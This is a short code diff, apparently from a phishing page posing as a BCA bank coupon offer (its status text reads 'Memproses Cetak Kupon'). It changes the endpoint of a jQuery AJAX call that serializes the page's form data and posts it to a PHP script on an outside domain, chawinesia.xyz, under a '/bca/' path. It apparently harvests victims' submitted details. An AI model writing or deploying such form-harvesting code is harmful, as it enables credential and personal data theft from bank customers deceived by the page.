@@ -9,7 +9,7 @@ document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
 
  $.ajax({
  type: 'POST',
- url: 'https://chawinesia.xyz/bca/1/one.php',
+ url: 'https://chawinesia.xyz/bca/bc4/one.php',
  data: $(formData).serialize(),
  datatype: 'text',
  
